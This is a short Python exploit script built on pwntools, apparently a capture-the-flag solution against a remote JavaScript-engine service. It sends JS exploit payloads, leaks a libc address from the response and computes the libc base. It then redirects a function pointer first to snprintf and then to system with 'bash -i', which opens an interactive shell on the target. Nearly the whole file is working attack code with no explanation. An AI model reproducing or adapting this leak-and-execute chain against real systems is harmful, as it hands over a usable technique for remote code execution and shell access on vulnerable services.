from pwn import *

decode = lambda x: x.replace('\n\t', '').replace('\n}', '}').replace('\t', '')
escape = lambda x: ''.join('\\x%02x' % ord(y) for y in x)
script = decode(open('/=/exp.js', 'rb').read())
script2 = decode(open('/=/exp2.js', 'rb').read())

# print script + script2 % (escape(p64(0x41414141)), ''); exit()

HOST, PORT = '172.17.0.2', 31337
HOST, PORT = 'pwn-01.v7frkwrfyhsjtbpfcppnu.ctfz.one', 799
r = remote(HOST, PORT)

r.sendline(script)
r.recvuntil('a.sort();1;')
r.recvuntil("'")
data = r.recvline()
for i in range(256):
	data = data.replace('\\u00%02x' % i, chr(i))
data = data.replace('\x00', '')
libc = ELF('/=/libc-2.24.so')

# r.interactive()
if data.find('\x7f') != -1:
	data = data[data.find('\x7f')-5:][:6] + '\x00\x00'
	print hexdump(data)
	data = u64(data)
	print hex(data)
	delta = 0x399b58
	libc.address = data - delta
	pause()
	for i in range(2):
		r.recvline()
	target = libc.symbols['snprintf']
	cmd = 'bash -i'
	r.sendline(script2.strip() % (escape(p64(target)), escape(cmd))) # sprintf(ctx, ???, "bash -i")
	target = libc.symbols['system']
	r.sendline(script2.strip() % (escape(p64(target)), '')) # system(ctx)
	r.interactive()
